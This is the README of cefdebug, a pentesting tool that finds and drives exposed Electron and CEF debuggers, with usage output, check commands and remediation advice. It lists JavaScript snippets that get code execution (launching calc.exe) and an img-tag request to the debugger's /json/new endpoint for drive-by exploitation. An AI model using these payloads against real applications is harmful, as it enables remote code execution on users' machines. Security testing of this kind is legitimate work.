# cefdebug

This is a minimal commandline utility and/or reference code for using
libwebsockets to connect to an electron/CEF/chromium debugger.

You're probably thinking, "who would enable the debugger in shipping products?".
Well, it turns out just about everyone shipping electron or CEF has made this
mistake at least once.

In some configurations, you can pop a shell remotely just by making a victim
click a link.

Example: https://bugs.chromium.org/p/project-zero/issues/detail?id=773

In older versions, you could pop a shell remotely using DNS rebinding.

Example: https://bugs.chromium.org/p/project-zero/issues/detail?id=1742

Example: https://bugs.chromium.org/p/project-zero/issues/detail?id=1946

In current versions, you can compromise other local users or escape sandboxes.

Example: https://bugs.chromium.org/p/project-zero/issues/detail?id=1944

It happens so often, that I thought pentesters might find it useful to have some
code easily available to interact with them.

# Usage

First, scan the local machine

```
$ ./cefdebug.exe
[2019/10/04 16:18:56:7288] U: There are 3 tcp sockets in state listen.
[2019/10/04 16:18:56:7766] U: There were 1 servers that appear to be CEF debuggers.
[2019/10/04 16:18:56:7816] U: ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a
```

Now you can send commands to that `ws://` URL.

```
$ ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
[2019/10/04 16:35:06:2645] U: >>> process.version
[2019/10/04 16:35:06:2685] U: <<< v10.11.0
```

Alternatively, you can start a simple interactive shell.

```
$ ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a
>>> ['hello', 'world'].join(' ')
[2019/10/04 16:36:31:0964] U: <<< hello world
>>> a = 1024
[2019/10/04 16:36:44:5250] U: <<< 1024
>>> a * 2
[2019/10/04 16:36:48:3005] U: <<< 2048
>>> quit
```

### Known Examples

Here are a list of code snippets I've seen that allow code exec in different electron
applications.

`process.mainModule.require('child_process').exec('calc')`

`window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")`

`require('child_process').spawnSync('calc.exe')`

`Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))`

### Notes
Here are things to test if you find a debugger.

* Does it prevent [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding)?

`$ curl -H 'Host: example.com' -si 'http://127.0.0.1:9234/json/list'`

🚨 If that works (i.e. json response), this is **remotely** exploitable. 🚨

Newer versions of chromium require that the Host header match `localhost` or an
IP address to prevent this. If this works, the application you're looking at is
based on an older version of chromium, and leaving the debugger enabled can be
**remotely** exploited. You have found a critical vulnerability and should
report it urgently.

* Is the `new` command functioning?

`$ curl -si 'http://127.0.0.1:9234/json/new?javascript:alert(1)'`

🔥🚨 If that works (i.e. a json response), this is **easily** **remotely** exploitable. 🚨🔥

This command requires no authentication, and has no CSRF protection. Just
`<img src=http://127.0.0.1:port/json/new?javascript:...>` in a website is
enough to exploit it. Even if the port is randomized, it can be brute forced
easily.

This is a very critical vulnerability, and should be reported urgently.

# Solution

If you maintain a CEF project and you've noticed you're vulnerable to this
attack, you probably need to change this setting in your `cef_settings_t`
for production builds:

https://magpcss.org/ceforum/apidocs3/projects/(default)/_cef_settings_t.html#remote_debugging_port

In electron, it's possible you're doing something like:

`app.commandLine.appendSwitch('remote-debugging-port'...)`

If you're using node, perhaps you're using `--inspect` on child processes.

https://nodejs.org/de/docs/guides/debugging-getting-started/#security-implications

# Building

## Windows 

> If you don't want to build it yourself, check out the [releases](https://github.com/taviso/cefdebug/releases) tab

I used [GNU make](http://gnuwin32.sourceforge.net/packages/make.htm) and Visual
Studio 2019 to develop `cefdebug`. 

If all the dependencies are installed, just typing `make` in a developer command
prompt should be enough.

I use the "Build Tools" variant of Visual Studio, and the only components I have
selected are MSVC, MSBuild, CMake and the SDK.

This project uses submodules for some of the dependencies, be sure that you're
using a command like this to fetch all the required code.

```
git submodule update --init --recursive
```
## Linux

The main depdencies are libwebsockets and libreadline.

On Fedora, try:

`yum install readline-devel libwebsockets-devel openssl-devel`

If the dependencies are intalled, try `make -f GNUmakefile.linux`

## Embedding

The code is intended to be simple enough to embed in other pentesting tools.

# Authors

Tavis Ormandy <taviso@gmail.com>

# License

All original code is Apache 2.0, See LICENSE file for details.

The following components are imported third party projects.

* [wineditline](http://mingweditline.sourceforge.net/), by Paolo Tosco.
  * wineditline is used to implement user friendly command-line input and
    history editing.
* [libwebsockets](https://libwebsockets.org), by Andy Green et al.
  * libwebsockets is a portable c implementation of HTML5 websockets.
